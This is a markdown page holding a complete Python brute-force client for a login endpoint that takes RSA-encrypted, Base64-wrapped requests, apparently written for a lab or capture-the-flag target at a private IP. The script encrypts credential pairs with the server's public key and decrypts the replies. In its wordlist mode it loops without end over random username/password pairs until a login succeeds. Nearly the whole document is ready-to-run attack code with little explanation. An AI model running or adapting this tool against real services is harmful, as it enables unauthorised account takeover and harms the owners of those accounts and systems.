# RSA ENCRYPTED LOGIN BRUTE-FORCE CLIENT

This script targets a login endpoint that expects RSA-encrypted (PKCS#1 v1.5), Base64-wrapped request bodies. It encrypts username/password pairs with the server's public key before sending, decrypts the JSON response with a client private key, and supports both single-credential testing and a randomized brute-force loop against a wordlist.

---

Encrypts `action=login&username=...&password=...` with the server's RSA public key, POSTs it as `{"data": <b64>}`, then decrypts the returned `data` field with the client's RSA private key to read the result.

---
### Script:
```python
import argparse
import base64
import random
import requests
from urllib.parse import urlencode

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Random import get_random_bytes

from keys import (
    server_public_key_pem,
    client_private_key_pem,
    client_public_key_pem,
)

# Load RSA keys
server_public_key = RSA.import_key(server_public_key_pem)
client_private_key = RSA.import_key(client_private_key_pem)
client_public_key = RSA.import_key(client_public_key_pem)

# RSA handlers
encryptor = PKCS1_v1_5.new(server_public_key)
decryptor = PKCS1_v1_5.new(client_private_key)

DEFAULT_URL = "http://10.80.191.79/server.php"


def debug_print(label, content):
    print(f"\n[{label}]")
    print(content)


def encrypt_payload(payload: str) -> str:
    encrypted = encryptor.encrypt(payload.encode())
    return base64.b64encode(encrypted).decode()


def decrypt_response(data: str) -> str:
    try:
        decoded = base64.b64decode(data)
        sentinel = get_random_bytes(16)

        decrypted = decryptor.decrypt(decoded, sentinel)

        if decrypted == sentinel:
            return "RSA decryption failed"

        return decrypted.decode(errors="ignore")

    except Exception as e:
        return f"Decryption Failed: {e}"


def send_login_request(username: str, password: str, url: str):
    payload = {
        "action": "login",
        "username": username,
        "password": password,
    }

    encoded = urlencode(payload)

    debug_print(
        "TRY",
        f"Username: {username} | Password: {password}"
    )

    debug_print("ENCODED", encoded)

    encrypted_data = encrypt_payload(encoded)

    debug_print("ENCRYPTED", encrypted_data)

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
    }

    response = requests.post(
        url,
        headers=headers,
        json={"data": encrypted_data},
        timeout=10,
    )

    debug_print("RAW", response.text)

    try:
        response_json = response.json()

        if "data" in response_json:
            decrypted = decrypt_response(response_json["data"])
            debug_print("RESP", decrypted)
            return decrypted

        debug_print("WARN", "No 'data' field found")
        return response.text

    except Exception as e:
        debug_print("WARN", f"JSON parse failed: {e}")
        return response.text


def brute_force_random(wordlist_path: str, url: str):
    with open(
        wordlist_path,
        "r",
        encoding="utf-8",
        errors="ignore",
    ) as f:
        words = [line.strip() for line in f if line.strip()]

    while True:
        username = random.choice(words)
        password = random.choice(words)

        response = send_login_request(
            username,
            password,
            url,
        )

        if response and "Login failed" not in response:
            print(
                f"\n[SUCCESS] Username: {username} | Password: {password}"
            )
            print(f"[RESPONSE] {response}")
            break


def main():
    parser = argparse.ArgumentParser(
        description="RSA encrypted login client"
    )

    parser.add_argument(
        "-u",
        "--username",
        help="Username to send",
    )

    parser.add_argument(
        "-p",
        "--password",
        help="Password to send",
    )

    parser.add_argument(
        "-w",
        "--wordlist",
        help="Wordlist path for brute force mode",
    )

    parser.add_argument(
        "--url",
        default=DEFAULT_URL,
        help="Target URL",
    )

    args = parser.parse_args()

    # Wordlist mode
    if args.wordlist:
        brute_force_random(
            args.wordlist,
            args.url,
        )
        return

    # Single request mode
    if args.username is not None and args.password is not None:
        response = send_login_request(
            args.username,
            args.password,
            args.url,
        )

        print("\n[FINAL RESPONSE]")
        print(response)
        return

    parser.error(
        "Provide either: "
        "-u USERNAME -p PASSWORD "
        "or "
        "-w WORDLIST"
    )


if __name__ == "__main__":
    main()
```
